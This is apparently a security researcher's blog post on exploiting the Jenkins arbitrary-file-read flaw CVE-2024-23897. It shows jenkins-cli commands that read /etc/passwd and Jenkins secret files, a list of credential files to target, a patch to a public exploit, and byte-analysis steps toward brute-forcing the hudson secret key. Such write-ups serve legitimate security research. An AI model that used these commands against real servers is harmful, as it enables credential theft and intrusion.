---
title: When US Export Restrictions Become an Advantage for Attackers (CVE-2024-23897)
date: 2024-07-02 13:33:37 +/-TTTT
categories: [crypto]
tags: [crypto,jenkins,hudson]     # TAG names should always be lowercase
image:
  path: https://s2.ezgif.com/tmp/ezgif-2-f4dfe46c67.gif
  show_in_post: true
---

## TL;DR:

You encountered a Jenkins instance vulnerable to CVE-2024-23897, which allows for arbitrary file read. Without credentials and with the /script endpoint inaccessible, You sought to leverage this vulnerability to gain further access through Jenkins.

## What is CVE-2024-23897?

>CVE-2024-23897 is a critical vulnerability in Jenkins that allows attackers to read arbitrary files on the Jenkins server, potentially leading to remote code execution (RCE). This vulnerability originates from the args4j library, which automatically expands file contents into command arguments when an argument begins with the "@" character.

While online resources commonly state that this vulnerability can result in RCE, they often do not elucidate the specific conditions under which this escalation can occur.

### RCE Conditions:

1. **Resource Root URL:**
   - The "Resource Root URL" functionality is enabled.
   - Attackers can retrieve binary secrets.
   - The attacker requires an API token for a (non-anonymous) user account. This user account does not need to currently possess Overall/Read permission.

2. **"Remember Me" Cookie:**
   - The "Remember me" feature is enabled (default setting).
   - Attackers possess Overall/Read permission, allowing them to read content in files beyond the initial lines.
   - Attackers can retrieve binary secrets.

3. **Remote Code Execution via CSRF Protection Bypass:**
   - Attackers can retrieve binary secrets.
   - The web session ID is not part of CSRF crumbs.

In our case, none of the above conditions were met. Additionally, the advisory mentions limitations regarding reading binary files, as detailed below:

><span style="color:red">**Limitations for reading binary files**</span>
![Jenkins Advisory Limitations of binary reading](https://ahmedsherif.github.io/assets/img/posts/2/jenkins-advisory-binary.png)

[Reference](https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314)

## Available exploit

There are several available POCs and the best one I tried so far was [this one](https://github.com/xaitax/CVE-2024-23897.git)

```bash
git clone https://github.com/xaitax/CVE-2024-23897.git
```

![Reading /etc/passwd](https://ahmedsherif.github.io/assets/img/posts/2/Exploit-etc-passwd.png)

Since we are unauthenticated users, we are only allowed to read 3 lines of any file based on the following commands

- `who-am-i`: reads the first line. 
- `enable-job`: reads second line. 
- `help`: reads the 3rd line. 

You can also execute it directly from jenkins-cli.jar that can be found in the following URL: `http://target/jnlpJars/jenkins-cli.jar`. 

```bash
java -jar jenkins-cli.jar -s http://sherif.com:9091 who-am-i '@/etc/passwd' 2>&1

ERROR: No argument is allowed: root:x:0:0:root:/root:/bin/bash
java -jar jenkins-cli.jar who-am-i
Reports your credential and permissions.

```

> During the actual assessment most likely the target needs to be accessed through tunneling (i.e. proxychains), in which `jenkins-cli.jar` will not work through but the python script. still `proxifier` can solve this on a windows machine. 
{: .prompt-warning }


## Enumeration!

Given the limitations on the files we can read, we need to identify files of interest that may partially assist us.

#### Notable Files:
- `/proc/self/environ`
- `/proc/self/cmdline`
- `${JENKINS_HOME}/credentials.xml` (Jenkins home can be found in `/proc/self`)
- `${JENKINS_HOME}/secrets/master.key`
- `${JENKINS_HOME}/secrets/initialAdminPassword`

Unfortunately, even if all the above files, including `master.key`, are obtained, they will not be sufficient.

Analyzing how Jenkins encrypts and decrypts credentials, as demonstrated in [this script](https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py), reveals that three components are required:

- `master.key`
- `hudson.util.Secret` (binary file)
- `encrypted credential` (e.g., `AQAAABAAAAAQmEZaw8Fv9tPlXWVQye1TR2KgF3p/wGoYs/TEQCmSxkk=`)

TBD How Jenkins do encryption and Decryption

## Analyzing retrieval of binary data

In the context of binary data retrieval, the absence of `hudson.util.Secret` presents a significant challenge. Attempts to retrieve it using the exploit mentioned above will fail, accompanied by the following error:

```python
❌ http://sherif.com:9091 not reachable: 'utf-8' codec can't decode byte 0xc6 in position 10: invalid continuation byte
```

This issue arises due to the presence of non-printable characters. However, modifying line 80 as follows resolves this:
```python
 result = response.hex()
 ```
> During research, it was observed that ippSec encountered similar issues while attempting to solve the builder machine, as highlighted in their YouTube video https://www.youtube.com/watch?v=jYCOIf9Fcmo&t=1427s. 
{: .prompt-info }


### Wireshark analysis
A Wireshark analysis was conducted to examine the retrieval of binary files. Notably, the binary file begins after the byte sequence `643a20`, with a repetitive sequence of `EFBFBD` starting from the 4th byte.


![wireshark-analysis](https://ahmedsherif.github.io/assets/img/posts/2/wireshark-dump.png)

> This was only the case on the testing environment, will explain more below
{: .prompt-danger}
## EFBFBD and UTF-8 conversion (�)


EF BF BD (in hex), which is the utf-8 encoding of the Unicode character U+FFFD [Replacement characters](https://www.fileformat.info/info/unicode/char/0fffd/index.htm).When decoding sequences of bytes into Unicode characters, a program may encounter a group bytes that is invalid (i.e. it does not correspond to a Unicode character). In such cases, the program has three choices: it can stop decoding and raise an error, silently skip over the invalid group of bytes, or translate the group of bytes into a special marker. This latter scheme allows most of the text to be read, but still leaves an indication that something went wrong.

coming across the blog of [errno](https://www.errno.fr/bruteforcing_CVE-2024-23897.html), it was an amazing inspiration for me. Errno had a new finding which is related to the US export restrictions, this simply means that the keys are only `128 bits / 16 bytes`. 

![US export keys](https://ahmedsherif.github.io/assets/img/posts/2/export-keys-jenkins.png)

## Game Over, right? 

Now after reading the code and blogpost of Errno and understanding the replacement characters, we are good to go and I was excited to start cracking the Hudson and confidentiality key. But Unfortunately that was not the case! 

Looking at the first 16 bytes in my case, clearly I can see no `EFBFBD` replacement character: 

![Jenkins-hex-hudson](https://ahmedsherif.github.io/assets/img/posts/2/Jenkins-hex-hudson.png)


> The above output is from exploiting the arbitrary file read, we can read the hudson bytes directly assuming the first bytes starts after `3a20`. The first 32 bytes are output from Jenkins-cli itself and irrelevant.
{: .prompt-tip }

You can achieve this by command line 
```bash
cat hudson.bin | tail -c +33 | head -c +16 | xxd
```
![hex-hudson-read-16bytes](https://ahmedsherif.github.io/assets/img/posts/2/Jenkins-reading-Hudson-16bytes.png)

### Repeated byte

Well, since we lost hope in our case for finding the replacement characters `EFBFBD`, we could actually assume that the hudson file did not have non-printable characters and is correct, but that was not the case since we could not decrypt our credentials with it. 

The other assumption is that we have a different encoding and replacement character could be anything else, so maybe we can try with repeated bytes?! 

```bash
dd if=hudson.bin bs=1 skip=32 count=16 2>/dev/null | xxd -p | fold -w2 | sort | uniq -c | sort -nr | head -n 1
```

![Hudson-Repeated-byte](https://ahmedsherif.github.io/assets/img/posts/2/Jenkins-repeated-byte.png)

Of course, I was not sure if this approach will work or not but that was the next logical step for me. 

```bash
cat masterkey.bin | xxd -p | tr -d '\n' | xxd -r -p | sha256sum | cut -c1-32 | sed 's/../0x&,/g'
```


```bash
java -jar ~/Downloads/jenkins-cli.jar -s http://127.0.0.1:9091 who-am-i '@/var/jenkins_home/secrets/hudson.util.Secret' 2>&1  | tail -c +33 | head -c 192 | xxd | tee hudson.bin
```
